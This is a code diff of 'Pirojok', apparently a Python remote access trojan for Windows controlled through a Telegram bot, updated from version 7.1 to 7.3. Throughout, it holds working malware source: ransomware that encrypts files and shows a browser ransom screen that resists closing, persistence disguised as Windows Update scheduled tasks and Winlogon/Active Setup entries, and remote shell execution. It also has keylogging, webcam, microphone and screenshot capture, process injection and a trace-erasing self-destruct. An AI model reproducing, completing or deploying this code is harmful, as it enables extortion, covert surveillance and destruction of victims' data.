+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                    text=True
+                )
+            
+            stdout, stderr = process.communicate(timeout=30)
+            
+            result = ""
+            if stdout:
+                result += f"[OUT]\n{stdout}\n"
+            if stderr:
+                result += f"[ERR]\n{stderr}\n"
+            
+            if not result:
+                result = "[OK] Command executed (no output)"
+            
+            self.history.append(result[:200])
+            return result[:3500]
+            
+        except subprocess.TimeoutExpired:
+            process.kill()
+            return "[ERROR] Command timeout (30s)"
+        except Exception as e:
+            return f"[ERROR] {e}"
+    
+    def get_history(self):
+        """Show command history"""
+        return "\n".join(self.history[-20:])
+
+
 class PirojokRansomware:
     def __init__(self, parent):
         self.p = parent
@@ -784,78 +910,124 @@ class PirojokRansomware:
         self.encryption_key = os.urandom(32)
         return base64.b64encode(self.encryption_key).decode()
     
-    def block_all_keys(self):
-        """FULL key blocking including ESC and Alt+F4"""
+    def show_ransom_window(self):
+        """Show fullscreen window with ransom message"""
         try:
-            import ctypes
-            from ctypes import wintypes
+            # Create HTML file with ransom message
+            html_path = os.path.join(tempfile.gettempdir(), "pirojok_ransom.html")
             
-            # Block via registry
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+            html_content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PIROJOK RANSOMWARE</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            text-align: center;
+            padding-top: 15%;
+            margin: 0;
+            overflow: hidden;
+        }
+        .blink {
+            animation: blink 2s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .warning {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 50px;
+            text-shadow: 0 0 10px red;
+        }
+        .message {
+            font-size: 32px;
+            margin: 30px;
+            color: #ff4444;
+        }
+        .danger {
+            color: #ff0000;
+            font-size: 28px;
+            border: 2px solid red;
+            padding: 20px;
+            margin: 50px;
+            background-color: rgba(255,0,0,0.1);
+        }
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            font-size: 18px;
+            color: #660000;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning blink">⚠️ WARNING ⚠️</div>
+    <div class="message">YOUR DATA IS ENCRYPTED</div>
+    <div class="danger">
+        DO NOT TRY TO RESTART YOUR COMPUTER<br>
+        OTHERWISE IT WILL DESTROY YOUR DATA
+    </div>
+    <div class="footer">
+        Check Telegram for decryption key | PIROJOK RANSOMWARE
+    </div>
+    <script>
+        // Prevent closing
+        window.onbeforeunload = function() {
+            return "Do not close this window!";
+        };
+        
+        // Fullscreen
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        }
+        
+        // Block ESC, F11, Alt+F4
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' || e.key === 'F11' || (e.altKey && e.key === 'F4')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
+            """
             
-            try:
-                winreg.CreateKey(key, subkey)
-                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
-                    winreg.SetValueEx(regkey, "NoViewContextMenu", 0, winreg.REG_DWORD, 1)
-                    winreg.SetValueEx(regkey, "NoTrayContextMenu", 0, winreg.REG_DWORD, 1)
-                    winreg.SetValueEx(regkey, "NoChangeStartMenu", 0, winreg.REG_DWORD, 1)
-                    winreg.SetValueEx(regkey, "NoClose", 0, winreg.REG_DWORD, 1)
-            except: pass
+            with open(html_path, 'w', encoding='utf-8') as f:
+                f.write(html_content)
             
-            # Disable Task Manager
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
-            
-            try:
-                winreg.CreateKey(key, subkey)
-                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-                    winreg.SetValueEx(regkey, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
-            except: pass
-            
-            # Block Alt+Tab, Alt+F4, ESC via SystemParametersInfo
-            user32 = ctypes.windll.user32
-            user32.SystemParametersInfoW(0x0097, 1, None, 0)  # SPI_SCREENSAVERRUNNING
-            
-            # Register hotkeys to block specific keys
-            # F1-F12
-            for i in range(1, 13):
-                user32.RegisterHotKey(None, i, 0, 0x70 + i - 1)
-            
-            # ESC (VK_ESCAPE = 0x1B)
-            user32.RegisterHotKey(None, 13, 0, 0x1B)
-            
-            # Alt+F4 (MOD_ALT = 0x0001, VK_F4 = 0x73)
-            user32.RegisterHotKey(None, 14, 0x0001, 0x73)
-            
-            # Alt+Tab (MOD_ALT = 0x0001, VK_TAB = 0x09)
-            user32.RegisterHotKey(None, 15, 0x0001, 0x09)
-            
-            self.active = True
-            return True
+            # Open in default browser
+            os.startfile(html_path)
             
         except Exception as e:
-            print(f"Error blocking keys: {e}")
-            return False
+            print(f"Error showing window: {e}")
+            self.show_cmd_message_fallback()
     
-    def show_cmd_message(self):
-        """Show message in CMD window"""
+    def show_cmd_message_fallback(self):
+        """Fallback CMD message if HTML fails"""
         try:
             bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
             message = """
-+--------------------------------------------------------------+
-|                    PIROJOK RANSOMWARE                        |
-+--------------------------------------------------------------+
-|                                                              |
-|   YOUR FILES HAVE BEEN ENCRYPTED!                            |
-|                                                              |
-|                                                              |
-|                                                              |
-|   To unlock, enter decryption key                            |
-|                                                              |
-+--------------------------------------------------------------+
+╔══════════════════════════════════════════════════════════════╗
+║                    PIROJOK RANSOMWARE                        ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   YOUR DATA IS ENCRYPTED                                     ║
+║                                                              ║
+║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
+║   OTHERWISE IT WILL DESTROY YOUR DATA                        ║
+║                                                              ║
+║   Check Telegram for decryption key                          ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
             """
             with open(bat_path, 'w', encoding='utf-8') as f:
                 f.write(f'''@echo off
@@ -864,52 +1036,13 @@ color 0C
 mode con cols=70 lines=20
 echo {message}
 echo.
-echo CHECK TELEGRAM FOR DECRYPTION KEY
+echo DO NOT CLOSE THIS WINDOW
 echo.
 pause > nul
 ''')
-            self.cmd_window = subprocess.Popen(
-                ['cmd', '/c', 'start', '/min', 'cmd', '/c', bat_path],
-                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            time.sleep(1)
             os.system(f'start /max cmd /c "{bat_path}"')
         except Exception as e:
             print(f"Error showing CMD: {e}")
-    
-    def show_decrypted_message(self):
-        """Show success message when decrypted"""
-        try:
-            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_decrypted.bat")
-            message = """
-+--------------------------------------------------------------+
-|                    PIROJOK RANSOMWARE                        |
-+--------------------------------------------------------------+
-|                                                              |
-|   YOUR SYSTEM HAS BEEN DECRYPTED!                            |
-|                                                              |
-|   ALL FILES HAVE BEEN RESTORED                               |
-|                                                              |
-|   KEYS ARE NOW UNLOCKED                                      |
-|                                                              |
-|   YOU CAN USE YOUR COMPUTER NORMALLY                         |
-|                                                              |
-+--------------------------------------------------------------+
-            """
-            with open(bat_path, 'w', encoding='utf-8') as f:
-                f.write(f'''@echo off
-title PIROJOK - SYSTEM DECRYPTED
-color 0A
-mode con cols=70 lines=20
-echo {message}
-echo.
-echo YOUR FILES HAVE BEEN RESTORED
-echo.
-pause
-del "%~f0"
-''')
-            os.system(f'start /max cmd /c "{bat_path}"')
-        except Exception as e:
-            print(f"Error showing decrypted message: {e}")
     
     def encrypt_file(self, filepath):
         try:
@@ -976,7 +1109,7 @@ del "%~f0"
         return encrypted
     
     def create_ransom_note(self):
-        """Create ransom note on REAL desktop"""
+        """Create ransom note on desktop"""
         try:
             desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
             if not os.path.exists(desktop):
@@ -988,21 +1121,23 @@ del "%~f0"
             key_b64 = base64.b64encode(self.encryption_key).decode()
             
             note = f"""
-+--------------------------------------------------------------+
-|                    PIROJOK RANSOMWARE                        |
-+--------------------------------------------------------------+
-|                                                              |
-|   Your files have been encrypted!                            |
-|                                                              |
-|   Total encrypted: {len(self.encrypted_files)} files         |
-|                                                              |
-|   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
-|   CHECK YOUR TELEGRAM BOT                                     |
-|                                                              |
-|   Keys F1-F12, ESC, SHIFT, CTRL, ALT+F4 are BLOCKED!        |
-|   Reboot to unlock (will lose files)                         |
-|                                                              |
-+--------------------------------------------------------------+
+╔══════════════════════════════════════════════════════════════╗
+║                    PIROJOK RANSOMWARE                        ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   Your files have been encrypted!                            ║
+║                                                              ║
+║   Total encrypted: {len(self.encrypted_files)} files         ║
+║                                                              ║
+║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
+║   Otherwise your data will be destroyed                      ║
+║                                                              ║
+║   To recover your files, send this command to Telegram:      ║
+║   ransom_decrypt {key_b64}                                   ║
+║                                                              ║
+║   Or use: ransom_key to get the key again                    ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
         """
             with open(note_path, 'w', encoding='utf-8') as f:
                 f.write(note)
@@ -1014,20 +1149,34 @@ del "%~f0"
             return fallback
     
     def start_ransomware(self):
+        """Start ransomware - NO KEY BLOCKING, just encryption"""
         try:
             self.p.send_message(self.p.owner_id, "[LOCK] Starting ransomware...")
-            self.block_all_keys()
-            self.p.send_message(self.p.owner_id, "[LOCK] Keys blocked (ESC, ALT+F4 included)!")
-            self.show_cmd_message()
-            self.p.send_message(self.p.owner_id, "[CMD] Message shown!")
+            
+            # Generate key
+            key = self.generate_key()
+            
+            # Show fancy window
+            self.show_ransom_window()
+            self.p.send_message(self.p.owner_id, "[WINDOW] Ransom window displayed")
+            
+            # Encrypt files
             encrypted = self.scan_and_encrypt()
             note = self.create_ransom_note()
+            
+            # Open note on desktop
             os.startfile(note)
+            
+            # Add to startup
             self.p.add_all_startup_methods()
+            
+            # Send key to Telegram
+            key_b64 = base64.b64encode(self.encryption_key).decode()
+            self.p.send_message(self.p.owner_id, f"🔐 DECRYPTION KEY:\n{key_b64}")
+            
             result = f"[OK] Encrypted {len(encrypted)} files\n"
             result += f"[NOTE] {note}\n"
-            result += f"[KEY] {base64.b64encode(self.encryption_key).decode()}\n"
-            result += f"[LOCK] Keys blocked!\n"
+            result += f"[KEY] Sent to Telegram\n"
             result += f"[AUTO] Startup installed!"
             return result
         except Exception as e:
@@ -1060,34 +1209,26 @@ del "%~f0"
                 except: pass
             
             if decrypted > 0:
-                self.unblock_keys()
                 self.remove_cmd_message()
                 self.p.remove_all_startup()
                 self.active = False
-                self.show_decrypted_message()
-                return f"[OK] SYSTEM DECRYPTED! {decrypted} files recovered"
+                return f"[OK] DECRYPTED! {decrypted} files recovered"
             else:
                 return "[ERROR] No encrypted files found or invalid key"
         except Exception as e:
             return f"[ERROR] {str(e)}"
     
     def unblock_keys(self):
-        try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
-            try:
-                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 0)
-                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
-            except: pass
-            self.p.send_message(self.p.owner_id, "[UNLOCK] Keys unlocked!")
-        except: pass
+        """No key blocking anymore - just pass"""
+        pass
     
     def remove_cmd_message(self):
         try:
             if self.cmd_window:
                 self.cmd_window.terminate()
-            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*"')
+            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*" >nul 2>&1')
+            os.system('taskkill /f /im msedge.exe /fi "windowtitle eq *PIROJOK*" >nul 2>&1')
+            os.system('taskkill /f /im chrome.exe /fi "windowtitle eq *PIROJOK*" >nul 2>&1')
         except: pass
 
 
@@ -1099,7 +1240,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "7.1"  # Updated version
+        self.version = "7.3"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -1316,7 +1457,8 @@ class Pirojok:
         try:
             if self.ransom.encryption_key:
                 key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
-                return f"[KEY] {key_b64}"
+                # Return ONLY the key for easy copying
+                return key_b64
             else:
                 return "[ERROR] No key generated (run ransomware first)"
         except Exception as e:
@@ -1336,7 +1478,6 @@ class Pirojok:
         else:
             exe_path = os.path.abspath(__file__)
         
-        # Registry HKCU
         try:
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -1345,7 +1486,6 @@ class Pirojok:
             results.append("[OK] Registry HKCU")
         except: results.append("[FAIL] Registry HKCU")
         
-        # Startup folder
         try:
             startup_folder = os.path.join(os.getenv('APPDATA'),
                 r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -1364,7 +1504,6 @@ class Pirojok:
             results.append("[OK] Startup folder")
         except: results.append("[FAIL] Startup folder")
         
-        # Task scheduler (logon)
         try:
             task_name = "WindowsUpdateTask"
             cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
@@ -1374,7 +1513,6 @@ class Pirojok:
         except: results.append("[FAIL] Task scheduler (logon)")
         
         if self.admin_mode:
-            # Task scheduler (system startup)
             try:
                 task_name = "WindowsUpdateSystem"
                 cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
@@ -1383,7 +1521,6 @@ class Pirojok:
                 results.append("[OK] Task scheduler (startup)")
             except: results.append("[FAIL] Task scheduler (startup)")
             
-            # Winlogon Shell
             try:
                 key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                 key = winreg.HKEY_LOCAL_MACHINE
@@ -1398,7 +1535,6 @@ class Pirojok:
                 results.append("[OK] Winlogon Shell")
             except: results.append("[FAIL] Winlogon Shell")
             
-            # Active Setup
             try:
                 guid = str(uuid.uuid4())
                 key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
@@ -1415,7 +1551,6 @@ class Pirojok:
         """Remove from all startup locations"""
         results = []
         
-        # Remove from registry HKCU
         try:
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -1425,22 +1560,10 @@ class Pirojok:
         except:
             results.append("[INFO] Not found in registry")
         
-        # Remove from task scheduler
-        try:
-            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], 
-                          capture_output=True)
-            results.append("[OK] Removed WindowsUpdateTask")
-        except:
-            pass
+        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
+        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True)
+        results.append("[OK] Removed from task scheduler")
         
-        try:
-            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], 
-                          capture_output=True)
-            results.append("[OK] Removed WindowsUpdateSystem")
-        except:
-            pass
-        
-        # Remove from Winlogon Shell if admin
         if self.admin_mode:
             try:
                 key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -1464,7 +1587,6 @@ class Pirojok:
         results = []
         results.append("[STARTUP] Checking all locations:")
         
-        # Check registry HKCU
         try:
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -1477,7 +1599,6 @@ class Pirojok:
         except:
             results.append("[INFO] Could not check registry")
         
-        # Check startup folder
         try:
             startup_folder = os.path.join(os.getenv('APPDATA'),
                 r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -1488,7 +1609,6 @@ class Pirojok:
         except:
             results.append("[INFO] Could not check startup folder")
         
-        # Check task scheduler
         try:
             result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateTask'], 
                                    capture_output=True, text=True)
@@ -1509,7 +1629,6 @@ class Pirojok:
         except:
             results.append("[INFO] Could not check task scheduler (system)")
         
-        # Check Winlogon Shell (admin only)
         if self.admin_mode:
             try:
                 key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -1527,7 +1646,6 @@ class Pirojok:
             except:
                 results.append("[INFO] Could not check Winlogon Shell")
         
-        # Check Active Setup (admin only)
         if self.admin_mode:
             try:
                 key = winreg.HKEY_LOCAL_MACHINE
@@ -1553,7 +1671,6 @@ class Pirojok:
             except:
                 results.append("[INFO] Could not check Active Setup")
         
-        # Check watchdog
         results.append(self.hider.check_watchdog())
         
         return "\n".join(results)
@@ -1606,7 +1723,6 @@ class Pirojok:
             print(f"Photo error: {e}")
     
     def send_audio(self, chat_id, audio_bytes, caption=""):
-        """Send audio file"""
         try:
             timestamp = datetime.now().strftime('%H:%M:%S')
             simple_caption = f"[{timestamp}] {caption}"
@@ -1621,7 +1737,6 @@ class Pirojok:
             print(f"Audio error: {e}")
     
     def send_file(self, chat_id, file_bytes, filename, caption=""):
-        """Send file"""
         try:
             timestamp = datetime.now().strftime('%H:%M:%S')
             simple_caption = f"[{timestamp}] {caption}"
@@ -1654,7 +1769,6 @@ class Pirojok:
         return "\n".join(info)
     
     def take_screenshot(self):
-        """Take screenshot with multiple fallback methods"""
         try:
             screenshot = pyautogui.screenshot()
             img_bytes = io.BytesIO()
@@ -1697,6 +1811,96 @@ class Pirojok:
         except Exception as e:
             print(f"Startup error: {e}")
     
+    def self_destruct(self):
+        """Complete self-destruction of Pirojok"""
+        try:
+            results = []
+            results.append("[SELF] Starting self-destruction...")
+            
+            # 1. Remove from all startup locations
+            startup_result = self.remove_all_startup()
+            results.append(startup_result)
+            
+            # 2. Terminate all child processes
+            for proc in self.processes:
+                try:
+                    proc.terminate()
+                    time.sleep(0.1)
+                except:
+                    pass
+            results.append("[SELF] Child processes terminated")
+            
+            # 3. Stop keylogger if running
+            if self.spy.keylogger_active:
+                self.spy.stop_keylogger()
+                results.append("[SELF] Keylogger stopped")
+            
+            # 4. Delete all temporary files
+            temp_files = [
+                self.marker_file,
+                self.hider.watchdog_file,
+                self.spy.keylog_file,
+                os.path.join(tempfile.gettempdir(), "pirojok_downloads"),
+                os.path.join(tempfile.gettempdir(), "pirojok_msg.bat"),
+                os.path.join(tempfile.gettempdir(), "pirojok_decrypted.bat"),
+                os.path.join(tempfile.gettempdir(), "restart_pirojok.bat"),
+                os.path.join(tempfile.gettempdir(), "restore_pirojok.bat"),
+                os.path.join(tempfile.gettempdir(), "watchdog.vbs"),
+                os.path.join(tempfile.gettempdir(), "watchdog_startup.vbs"),
+                os.path.join(tempfile.gettempdir(), "keylogger.vbs"),
+                os.path.join(tempfile.gettempdir(), "change_icon.ps1"),
+                os.path.join(tempfile.gettempdir(), "webcam.jpg"),
+                os.path.join(tempfile.gettempdir(), "recording.wav"),
+                os.path.join(tempfile.gettempdir(), "pirojok_ransom.html"),
+            ]
+            
+            deleted_files = 0
+            for file_path in temp_files:
+                try:
+                    if os.path.isfile(file_path):
+                        os.remove(file_path)
+                        deleted_files += 1
+                    elif os.path.isdir(file_path):
+                        shutil.rmtree(file_path)
+                        deleted_files += 1
+                except:
+                    pass
+            
+            results.append(f"[SELF] Deleted {deleted_files} temporary files")
+            
+            # 5. Send farewell message
+            self.send_message(self.owner_id, "[SELF] Pirojok has eaten itself! Goodbye! 👋")
+            
+            # 6. Self-destruct EXE file
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+                bat_path = os.path.join(tempfile.gettempdir(), "self_destruct.bat")
+                
+                with open(bat_path, 'w') as f:
+                    f.write(f'''@echo off
+timeout /t 3 /nobreak > nul
+del "{exe_path}"
+if exist "{exe_path}" (
+    del /f /q "{exe_path}"
+)
+del "%~f0"
+''')
+                
+                subprocess.Popen(['cmd', '/c', bat_path], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                results.append("[SELF] EXE file scheduled for deletion")
+            
+            # Print results to console
+            print("\n".join(results))
+            
+            # Exit
+            time.sleep(2)
+            sys.exit(0)
+            
+        except Exception as e:
+            return f"[ERROR] Self-destruct failed: {e}"
+    
     def process_command(self, text, chat_id):
         if chat_id != self.owner_id:
             self.send_message(chat_id, "[ERROR] Not for you!")
@@ -1704,12 +1908,10 @@ class Pirojok:
         
         print(f"Command: {text}")
         
-        # ЗАЩИТА ОТ ДУБЛИРОВАНИЯ
         if self.processing:
             print("Already processing, skipping...")
             return
         
-        # Проверяем, не обрабатывали ли мы эту команду недавно
         if self.last_command == text and (datetime.now() - self.last_command_time).seconds < 2:
             print(f"Duplicate command '{text}' ignored")
             return
@@ -1724,10 +1926,9 @@ class Pirojok:
                 self.admin_mode = current_admin
                 print(f"Admin rights changed: {'YES' if self.admin_mode else 'NO'}")
             
-            # Commands that need admin rights
             admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                              "add_rule", "task_startup", "explorer_shell", "active_setup", 
-                             "inject", "watchdog", "ransom", "ransom_start"]
+                             "inject", "watchdog", "ransom", "ransom_start", "advanced_inject"]
             
             cmd_type = text.split()[0] if text else ""
             
@@ -1739,11 +1940,11 @@ class Pirojok:
             # === HELP / MENU ===
             if text == "help" or text == "menu":
                 help_text = """
-🔥 PIROJOK 7.1 - COMPLETE SPY SUITE 🔥
+🔥 PIROJOK 7.3 - ULTIMATE STEALTH SUITE 🔥
 
 [🎥] VIDEO/AUDIO:
 • webcam - take photo from webcam
-• mic [sec] - record microphone (default 5 sec)
+• mic [sec] - record microphone
 
 [📍] GEOLOCATION:
 • location - get location by IP
@@ -1768,14 +1969,18 @@ class Pirojok:
 
 [🔒] RANSOMWARE:
 • ransom - START RANSOMWARE!
-• ransom_key - show encryption key
+• ransom_key - show encryption key (ONLY KEY)
 • ransom_decrypt <key> - decrypt files
 
-[🥷] MASQUERADE:
+[🥷] STEALTH:
 • mask_status - show masquerade status
 • mask_remove - remove masquerade
-• inject - inject into system process
+• inject - create service
+• advanced_inject - inject into system (no file)
 • watchdog - enable self-recovery
+
+[💀] SELF DESTRUCT:
+• selfdestruct - Pirojok eats itself (clean all traces)
 
 [⚡] POWER:
 • shutdown_now - shutdown immediately
@@ -1828,7 +2033,7 @@ class Pirojok:
                 return
             
             if text == "wifi":
-                result = self.spy.get_location()  # Already has Wi-Fi
+                result = self.spy.get_location()
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
@@ -1924,6 +2129,7 @@ class Pirojok:
             
             if text == "ransom_key":
                 result = self.ransomware_key()
+                # Send ONLY the key, no extra text
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
@@ -1938,7 +2144,7 @@ class Pirojok:
                 self.processing = False
                 return
             
-            # === MASQUERADE ===
+            # === STEALTH COMMANDS ===
             if text == "mask_status":
                 self.send_message(chat_id, self.hider.get_mask_status())
                 self.processing = False
@@ -1956,9 +2162,22 @@ class Pirojok:
                 self.processing = False
                 return
             
+            if text == "advanced_inject":
+                result = self.hider.advanced_inject()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
             if text == "watchdog":
                 result = self.hider.setup_watchdog()
                 self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            # === SELF DESTRUCT ===
+            if text == "selfdestruct" or text == "self_destruct":
+                self.send_message(chat_id, "[SELF] Pirojok is eating itself... 🍽️")
+                threading.Thread(target=self.self_destruct, daemon=True).start()
                 self.processing = False
                 return
             
